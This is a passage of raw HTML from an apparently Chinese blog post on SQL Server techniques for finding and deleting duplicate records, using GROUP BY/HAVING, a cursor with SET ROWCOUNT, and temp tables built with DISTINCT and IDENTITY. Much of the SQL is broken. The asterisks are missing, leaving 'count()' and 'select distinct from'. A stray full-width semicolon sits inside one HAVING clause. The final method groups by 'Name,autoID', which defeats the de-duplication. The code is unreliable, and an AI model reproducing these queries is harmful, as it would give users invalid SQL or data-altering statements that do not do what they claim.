#000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #808080\">and</span><span style=\"color: #000000\">&nbsp;rowid&nbsp;</span><span style=\"color: #808080\">not</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">&nbsp;(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(rowid)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;vitae&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;peopleId,seq&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)</span><span style=\"color: #808080\">&gt;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><font face=\"Courier New\"><span style=\"color: #000000\">)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(二)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">比方说<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">在A表中存在一个字段“name”，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">而且不同记录之间的“name”值有可能会相同，<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br><br><font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\"><em></em></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\"></span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div><br><div><font face=\"Courier New\"><span style=\"color: #000000\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br><br><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: 